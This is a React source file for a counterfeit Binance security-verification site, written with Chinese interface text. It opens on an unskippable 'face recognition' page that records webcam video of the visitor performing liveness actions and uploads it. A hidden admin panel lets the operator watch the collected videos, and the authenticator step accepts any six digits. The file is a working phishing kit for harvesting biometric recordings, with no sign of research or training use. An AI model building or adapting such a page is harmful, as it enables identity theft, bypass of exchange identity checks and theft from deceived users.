import { useEffect, useRef, useState, type FormEvent, type ReactNode } from "react";
import {
  ArrowLeft,
  ArrowRight,
  Check,
  Eye,
  EyeOff,
  LockKeyhole,
  Shield,
  ShieldCheck,
  Trash2,
  UserRound,
  X,
  Zap
} from "lucide-react";
import {
  adminLogin,
  deleteVerification,
  fetchVerifications,
  uploadVerification,
  type VerificationRecord
} from "./lib/api";
import {
  createFaceLandmarker,
  FaceActionDetector,
  FACE_ACTIONS,
  type ActionDetectionState
} from "./lib/faceActions";

type View =
  | "home"
  | "login-account"
  | "login-password"
  | "security"
  | "authenticator-otp"
  | "face-confirm"
  | "face-scan"
  | "processing"
  | "admin";

export function App() {
  const [view, setView] = useState<View>(location.pathname.startsWith("/admin") ? "admin" : "face-confirm");
  const [account, setAccount] = useState(() => `face-session-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
  const [password, setPassword] = useState("");
  const [verified, setVerified] = useState(false);
  const [authenticatorVerified, setAuthenticatorVerified] = useState(false);

  useEffect(() => {
    if (view === "admin") {
      history.replaceState(null, "", "/admin");
    } else {
      history.replaceState(null, "", "/");
    }
  }, [view]);

  if (view === "admin") {
    return <AdminPanel onBack={() => setView("face-confirm")} />;
  }

  return (
    <main className={view === "home" ? "app app-home" : "app app-auth"}>
      {view === "home" && <Home onLogin={() => setView("login-account")} onAdmin={() => setView("admin")} />}
      {view === "login-account" && (
        <LoginAccount
          account={account}
          onChange={setAccount}
          onClose={() => setView("home")}
          onNext={() => account.trim() && setView("login-password")}
        />
      )}
      {view === "login-password" && (
        <LoginPassword
          account={account}
          password={password}
          onChange={setPassword}
          onBack={() => setView("login-account")}
          onClose={() => setView("home")}
          onNext={() => password && setView("security")}
        />
      )}
      {view === "security" && (
        <SecurityStep
          verified={verified}
          authenticatorVerified={authenticatorVerified}
          onBack={() => setView("login-password")}
          onClose={() => setView("home")}
          onAuthenticator={() => setView("authenticator-otp")}
          onFace={() => setView("face-confirm")}
        />
      )}
      {view === "authenticator-otp" && (
        <OtpVerification
          mode="authenticator"
          account={account}
          onBack={() => setView("security")}
          onClose={() => setView("security")}
          onDone={() => {
            setAuthenticatorVerified(true);
            setView("security");
          }}
        />
      )}
      {view === "face-confirm" && (
        <FaceConfirm direct onBack={() => setView("face-confirm")} onClose={() => setView("face-confirm")} onStart={() => setView("face-scan")} />
      )}
      {view === "face-scan" && (
        <FaceScan
          account={account}
          onCancel={() => setView("face-confirm")}
          onDone={() => {
            setVerified(true);
            setView("processing");
          }}
        />
      )}
      {view === "processing" && <ProcessingScreen />}
    </main>
  );
}

function Home({ onLogin, onAdmin }: { onLogin: () => void; onAdmin: () => void }) {
  return (
    <section className="home-screen">
      <header className="brand-header">
        <div className="brand-mark" aria-label="Logo placeholder" />
        <nav>
          <span>首页</span>
          <span>功能</span>
          <span className="active">安全</span>
          <span>支持</span>
          <span className="active">APP</span>
        </nav>
        <div className="home-actions">
          <button className="primary" onClick={onLogin}>登录</button>
          <button className="outline">注册</button>
        </div>
      </header>

      <section className="hero-copy">
        <h1>交易平台</h1>
        <h2>全球领先的加密货币交易平台</h2>
        <p>随时随地交易多种加密货币，享受专业级的交易体验。APP 专为移动设备优化，让您不错过任何市场机会。</p>
      </section>

      <section className="feature-list">
        <Feature icon={<ShieldCheck />} title="企业级安全" text="多重加密与验证保护您的资产" />
        <Feature icon={<Zap />} title="极速交易" text="毫秒级交易执行，把握每个机会" />
        <Feature icon={<LockKeyhole />} title="全球覆盖" text="稳定服务全球用户，随时掌握行情" />
      </section>

      <button className="admin-link" onClick={onAdmin}>后台管理</button>
    </section>
  );
}

function Feature({ icon, title, text }: { icon: ReactNode; title: string; text: string }) {
  return (
    <article className="feature">
      <div className="feature-icon">{icon}</div>
      <div>
        <h3>{title}</h3>
        <p>{text}</p>
      </div>
    </article>
  );
}

function LoginShell({ children }: { children: ReactNode }) {
  return <section className="login-sheet">{children}</section>;
}

function LoginAccount(props: {
  account: string;
  onChange: (value: string) => void;
  onNext: () => void;
  onClose: () => void;
}) {
  return (
    <LoginShell>
      <button className="icon-button close" onClick={props.onClose}><X /></button>
      <h1>登录</h1>
      <label>邮箱/手机号码</label>
      <div className="input-row">
        <span className="country-flag" aria-label="中国国旗">
          <span className="flag-star main-star" />
          <span className="flag-star star-one" />
          <span className="flag-star star-two" />
          <span className="flag-star star-three" />
          <span className="flag-star star-four" />
        </span>
        <span className="country-code">+86</span>
        <span className="input-separator" />
        <input value={props.account} onChange={(event) => props.onChange(event.target.value)} />
        {props.account && <button className="clear-button" onClick={() => props.onChange("")}><X /></button>}
      </div>
      <button className="yellow-button" onClick={props.onNext}>继续</button>
      <div className="divider"><span>或</span></div>
      <button className="social-button"><GoogleLogo /><span>通过 Google 继续</span></button>
      <button className="social-button"><AppleLogo /><span>通过 Apple 继续</span></button>
      <a>创建币安账户</a>
      <a>无法登录?</a>
    </LoginShell>
  );
}

function GoogleLogo() {
  return (
    <svg className="brand-logo" viewBox="0 0 24 24" aria-hidden="true">
      <path fill="#4285f4" d="M22.6 12.23c0-.79-.07-1.55-.2-2.23H12v4.22h5.94a5.08 5.08 0 0 1-2.2 3.33v2.72h3.56c2.08-1.92 3.3-4.74 3.3-8.04Z" />
      <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.56-2.72c-.98.66-2.23 1.05-3.72 1.05-2.86 0-5.28-1.93-6.15-4.53H2.18v2.81A11 11 0 0 0 12 23Z" />
      <path fill="#fbbc05" d="M5.85 14.14A6.6 6.6 0 0 1 5.5 12c0-.74.13-1.46.35-2.14V7.05H2.18A11 11 0 0 0 1 12c0 1.78.43 3.46 1.18 4.95l3.67-2.81Z" />
      <path fill="#ea4335" d="M12 5.33c1.62 0 3.06.56 4.2 1.64l3.15-3.15C17.45 2.05 14.97 1 12 1A11 11 0 0 0 2.18 7.05l3.67 2.81c.87-2.6 3.29-4.53 6.15-4.53Z" />
    </svg>
  );
}

function AppleLogo() {
  return (
    <svg className="brand-logo apple-logo" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M16.6 12.83c-.03-2.43 1.99-3.6 2.08-3.65-1.14-1.66-2.9-1.89-3.52-1.91-1.48-.15-2.91.87-3.66.87-.77 0-1.93-.85-3.18-.83-1.63.03-3.15.95-3.99 2.41-1.72 2.98-.44 7.36 1.21 9.77.83 1.18 1.8 2.5 3.08 2.45 1.24-.05 1.71-.79 3.21-.79 1.49 0 1.93.79 3.23.76 1.34-.02 2.18-1.18 2.98-2.37.96-1.35 1.34-2.68 1.36-2.75-.03-.01-2.77-1.06-2.8-3.96ZM14.2 5.7c.67-.84 1.13-1.98 1-3.14-.97.04-2.18.67-2.88 1.49-.62.72-1.17 1.91-1.02 3.02 1.09.08 2.2-.55 2.9-1.37Z" />
    </svg>
  );
}

function LoginPassword(props: {
  account: string;
  password: string;
  onChange: (value: string) => void;
  onNext: () => void;
  onBack: () => void;
  onClose: () => void;
}) {
  const [visible, setVisible] = useState(false);
  const masked = props.account.length > 4 ? `${props.account.slice(0, 3)}****${props.account.slice(-4)}` : props.account;
  return (
    <LoginShell>
      <button className="icon-button back" onClick={props.onBack}><ArrowLeft /></button>
      <button className="icon-button close" onClick={props.onClose}><X /></button>
      <h1>请输入您的密码</h1>
      <p className="muted">{masked}</p>
      <label>密码</label>
      <div className="input-row">
        <input type={visible ? "text" : "password"} value={props.password} onChange={(event) => props.onChange(event.target.value)} autoFocus />
        {props.password && <button className="clear-button" onClick={() => props.onChange("")}><X /></button>}
        <button className="clear-button" onClick={() => setVisible(!visible)}>{visible ? <EyeOff /> : <Eye />}</button>
      </div>
      <button className="yellow-button" onClick={props.onNext}>继续</button>
      <a>忘记密码?</a>
    </LoginShell>
  );
}

function SecurityStep(props: {
  verified: boolean;
  authenticatorVerified: boolean;
  onBack: () => void;
  onClose: () => void;
  onAuthenticator: () => void;
  onFace: () => void;
}) {
  const passedCount = [props.authenticatorVerified, props.verified].filter(Boolean).length;
  return (
    <LoginShell>
      <button className="icon-button back" onClick={props.onBack}><ArrowLeft /></button>
      <button className="icon-button close" onClick={props.onClose}><X /></button>
      <h1>安全验证要求</h1>
      <p className="muted">您需要完成以下验证方可继续。</p>
      <strong className="count">{passedCount}/2</strong>
      <div className="verify-list">
        <button className="verify-row" onClick={props.onAuthenticator} disabled={props.authenticatorVerified}>
          <span><ShieldCheck /> Google 身份验证器</span>
          {props.authenticatorVerified ? <Check className="passed" /> : <ArrowRight />}
        </button>
        <button className="verify-row" onClick={props.onFace} disabled={props.verified}>
          <span><UserRound /> 人脸识别认证</span>
          {props.verified ? <Check className="passed" /> : <ArrowRight />}
        </button>
      </div>
      <a>安全验证不可用?</a>
      <footer className="sheet-footer">
        <span className="secure-shield"><Shield /><LockKeyhole /></span>
        受币安风控保护
      </footer>
    </LoginShell>
  );
}

function OtpVerification(props: {
  mode: "authenticator";
  account: string;
  onBack: () => void;
  onClose: () => void;
  onDone: () => void;
}) {
  const [code, setCode] = useState("");

  function submit() {
    if (code.length === 6) {
      props.onDone();
    }
  }

  return (
    <LoginShell>
      <button className="icon-button back" onClick={props.onBack}><ArrowLeft /></button>
      <button className="icon-button close" onClick={props.onClose}><X /></button>
      <h1>Google 身份验证器验证</h1>
      <p className="muted otp-desc">请输入 Google 身份验证器生成的6位验证码。</p>
      <label>Google 身份验证器</label>
      <div className="input-row otp-input-row">
        <input
          value={code}
          onChange={(event) => setCode(event.target.value.replace(/\D/g, "").slice(0, 6))}
          inputMode="numeric"
          maxLength={6}
          autoFocus
        />
        <button className="otp-side-action" type="button">粘贴</button>
      </div>
      <button className="yellow-button" onClick={submit}>提交</button>
      <a>安全验证不可用?</a>
      <footer className="sheet-footer">
        <span className="secure-shield"><Shield /><LockKeyhole /></span>
        受币安风控保护
      </footer>
    </LoginShell>
  );
}

function FaceConfirm(props: { direct?: boolean; onBack: () => void; onClose: () => void; onStart: () => void }) {
  return (
    <section className="face-confirm">
      {!props.direct && <button className="icon-button back light" onClick={props.onBack}><ArrowLeft /></button>}
      {!props.direct && <button className="icon-button close light" onClick={props.onClose}><X /></button>}
      <h1>安全验证</h1>
      <p>请遵循指示完成验证以继续。</p>
      <div className="face-illustration image-face-illustration" aria-hidden="true">
        <img src="/face-ui.png" alt="" />
      </div>
      <div className="notice-card">
        <p>请确认您是该账户的所有人</p>
        <p>请勿佩戴帽子和眼镜</p>
        <p>不要使用滤镜</p>
        <p>保持光线充足</p>
        <p>人脸验证用于确保账户安全，不可跳过</p>
      </div>
      <button className="yellow-button large" onClick={props.onStart}>通过人脸识别进行认证</button>
      <footer className="dark-footer">
        <span className="secure-shield"><Shield /><LockKeyhole /></span>
        受币安风控保护
      </footer>
    </section>
  );
}

function ProcessingScreen() {
  return (
    <section className="processing-screen" aria-live="polite">
      <div className="system-spinner" aria-hidden="true" />
    </section>
  );
}

function FaceScan({ account, onCancel, onDone }: { account: string; onCancel: () => void; onDone: () => void }) {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<BlobPart[]>([]);
  const startRef = useRef(0);
  const doneRef = useRef(false);
  const [state, setState] = useState<ActionDetectionState>({
    completed: [],
    currentIndex: 0,
    message: "正在启动摄像头",
    hasFace: false
  });
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [error, setError] = useState("");
  const [uploading, setUploading] = useState(false);
  const [countdownStarted, setCountdownStarted] = useState(false);

  useEffect(() => {
    let stream: MediaStream | null = null;
    let raf = 0;
    let timer = 0;
    let stopped = false;
    const countdownStartRef = { current: 0 };
    const detector = new FaceActionDetector();

    async function start() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        if (!videoRef.current) return;
        videoRef.current.srcObject = stream;
        await videoRef.current.play();

        const recorderOptions = getRecorderOptions();
        recorderRef.current = recorderOptions
          ? new MediaRecorder(stream, recorderOptions)
          : new MediaRecorder(stream);
        recorderRef.current.ondataavailable = (event) => {
          if (event.data.size) chunksRef.current.push(event.data);
        };
        recorderRef.current.start(500);
        startRef.current = performance.now();

        const landmarker = await createFaceLandmarker();
        const tick = () => {
          if (stopped || !videoRef.current || videoRef.current.readyState < 2) {
            raf = requestAnimationFrame(tick);
            return;
          }
          const result = landmarker.detectForVideo(videoRef.current, performance.now());
          const next = detector.update(result);
          if (next.hasFace && !countdownStartRef.current) {
            countdownStartRef.current = performance.now();
            setCountdownStarted(true);
          }
          setState(next);
          if (detector.isDone() && !doneRef.current) {
            doneRef.current = true;
            complete(detector.getCompletedLabels());
            return;
          }
          raf = requestAnimationFrame(tick);
        };
        tick();
        timer = window.setInterval(() => {
          if (!countdownStartRef.current) {
            setSecondsLeft(30);
            return;
          }
          const elapsed = Math.floor((performance.now() - countdownStartRef.current) / 1000);
          const left = Math.max(0, 30 - elapsed);
          setSecondsLeft(left);
          if (left === 0 && !doneRef.current) {
            doneRef.current = true;
            setError("验证超时，请重新认证");
            stopStream();
          }
        }, 250);
      } catch (err) {
        stopStream();
        setError(err instanceof Error ? `摄像头启动失败：${err.message}` : "摄像头启动失败，请检查权限后重试");
      }
    }

    function getRecorderOptions() {
      const supportedTypes = [
        "video/webm;codecs=vp9",
        "video/webm;codecs=vp8",
        "video/webm",
        "video/mp4"
      ];
      const mimeType = supportedTypes.find((type) => MediaRecorder.isTypeSupported(type));
      return mimeType ? { mimeType } : undefined;
    }

    async function complete(actions: string[]) {
      setUploading(true);
      try {
        const blob = await stopRecorder();
        stopStream();
        await uploadVerification({
          account,
          video: blob,
          actionsPassed: actions,
          durationMs: Math.round(performance.now() - startRef.current)
        });
        onDone();
      } catch (err) {
        setError(err instanceof Error ? err.message : "上传失败，请重试");
      } finally {
        setUploading(false);
      }
    }

    function stopStream() {
      stopped = true;
      if (raf) cancelAnimationFrame(raf);
      if (timer) clearInterval(timer);
      stream?.getTracks().forEach((track) => track.stop());
    }

    function stopRecorder() {
      return new Promise<Blob>((resolve) => {
        const recorder = recorderRef.current;
        if (!recorder || recorder.state === "inactive") {
          resolve(new Blob(chunksRef.current, { type: "video/webm" }));
          return;
        }
        recorder.onstop = () => resolve(new Blob(chunksRef.current, { type: recorder.mimeType || "video/webm" }));
        recorder.stop();
      });
    }

    start();
    return () => {
      stopStream();
      if (recorderRef.current?.state === "recording") recorderRef.current.stop();
    };
  }, [account, onDone]);

  return (
    <section className="face-scan">
      <button className="icon-button close scan-close" onClick={onCancel}><X /></button>
      <div className={`scan-frame ${state.hasFace ? "active" : ""}`}>
        <video className="scan-video" ref={videoRef} muted playsInline autoPlay />
        <img className="scan-face-guide" src="/scan-guide.svg" alt="" />
      </div>
      <div className="scan-status">
        {countdownStarted && <div className="scan-countdown">{secondsLeft}s</div>}
        <p className="scan-message">{uploading ? "正在上传认证视频" : error || state.message}</p>
      </div>
      {error && <button className="yellow-button retry" onClick={() => location.reload()}>重新认证</button>}
    </section>
  );
}

function AdminPanel({ onBack }: { onBack: () => void }) {
  const [token, setToken] = useState(localStorage.getItem("adminToken") || "");
  const [username, setUsername] = useState("admin");
  const [password, setPassword] = useState("");
  const [records, setRecords] = useState<VerificationRecord[]>([]);
  const [error, setError] = useState("");

  async function load(nextToken = token) {
    const data = await fetchVerifications(nextToken);
    setRecords(data);
  }

  useEffect(() => {
    if (token) load().catch(() => setToken(""));
  }, []);

  async function login(event: FormEvent) {
    event.preventDefault();
    setError("");
    try {
      const result = await adminLogin(username, password);
      localStorage.setItem("adminToken", result.token);
      setToken(result.token);
      await load(result.token);
    } catch (err) {
      setError(err instanceof Error ? err.message : "登录失败");
    }
  }

  async function remove(id: number) {
    await deleteVerification(token, id);
    await load();
  }

  if (!token) {
    return (
      <main className="admin-page">
        <form className="admin-login" onSubmit={login}>
          <button type="button" className="icon-button back" onClick={onBack}><ArrowLeft /></button>
          <h1>后台登录</h1>
          <input value={username} onChange={(event) => setUsername(event.target.value)} placeholder="管理员账号" />
          <input type="password" value={password} onChange={(event) => setPassword(event.target.value)} placeholder="管理员密码" />
          <button className="yellow-button">登录</button>
          {error && <p className="error-text">{error}</p>}
        </form>
      </main>
    );
  }

  return (
    <main className="admin-page">
      <header className="admin-topbar">
        <h1>认证记录</h1>
        <div>
          <button onClick={() => load()}>刷新</button>
          <button onClick={() => { localStorage.removeItem("adminToken"); setToken(""); }}>退出</button>
        </div>
      </header>
      <section className="records">
        {records.map((record) => (
          <article className="record" key={record.id}>
            <div>
              <h2>{record.account}</h2>
              <p>{new Date(record.created_at).toLocaleString()} · {(record.video_size / 1024 / 1024).toFixed(2)} MB</p>
              <p>动作：{safeActions(record.actions_passed)}</p>
            </div>
            <ProtectedVideo token={token} id={record.id} />
            <button className="danger-button" onClick={() => remove(record.id)}><Trash2 /> 删除</button>
          </article>
        ))}
        {!records.length && <p className="empty">暂无认证记录</p>}
      </section>
    </main>
  );
}

function ProtectedVideo({ token, id }: { token: string; id: number }) {
  const [src, setSrc] = useState("");

  useEffect(() => {
    let objectUrl = "";
    fetch(`/api/admin/verifications/${id}/video`, {
      headers: { Authorization: `Bearer ${token}` }
    })
      .then((response) => {
        if (!response.ok) throw new Error("video failed");
        return response.blob();
      })
      .then((blob) => {
        objectUrl = URL.createObjectURL(blob);
        setSrc(objectUrl);
      })
      .catch(() => setSrc(""));

    return () => {
      if (objectUrl) URL.revokeObjectURL(objectUrl);
    };
  }, [id, token]);

  return src ? <video src={src} controls preload="metadata" /> : <div className="video-placeholder">视频加载中</div>;
}

function safeActions(raw: string) {
  try {
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed.join("、") : raw;
  } catch {
    return raw;
  }
}
